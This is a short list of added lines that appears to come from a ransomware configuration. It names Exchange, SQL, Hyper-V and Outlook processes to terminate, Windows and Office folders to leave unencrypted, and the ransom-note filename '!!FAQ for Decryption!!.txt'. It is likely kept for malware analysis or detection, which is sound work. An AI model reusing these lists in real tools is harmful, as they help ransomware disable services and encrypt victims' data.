+sqlbrowser.exe
+vmcompute
+vmwp.exe
+vmsp.exe
+outlook.exe
+MSExchangeUMCR
+MSExchangeUM
+MSExchangeTransportLogSearch
+MSExchangeTransport
+MSExchangeThrottling
+MSExchangeSubmission
+MSExchangeServiceHost
+MSExchangeRPC
+MSExchangeRepl
+MSExchangePOP3BE
+MSExchangePop3
+MSExchangeNotificationsBroker
+MSExchangeMailboxReplication
+MSExchangeMailboxAssistants
+MSExchangeIS
+MSExchangeIMAP4BE
+MSExchangeImap4
+MSExchangeHMRecovery
+MSExchangeHM
+MSExchangeFrontEndTransport
+MSExchangeFastSearch
+MSExchangeEdgeSync
+MSExchangeDiagnostics
+MSExchangeDelivery
+MSExchangeDagMgmt
+MSExchangeCompliance
+MSExchangeAntispamUpdate
+\Windows\
+\Program Files\Microsoft Office\
+\Program Files (x86)\Microsoft Office\
+\$Recycle.Bin\
+\Boot\
+\Recovery\
+\System Volume Information\
+\MSOCache\
+\Users\All Users\
+\Users\Default User\
+\Users\Default\
+\Temp\
+\INetCache\
+\Google\
+!!FAQ for Decryption!!.txt
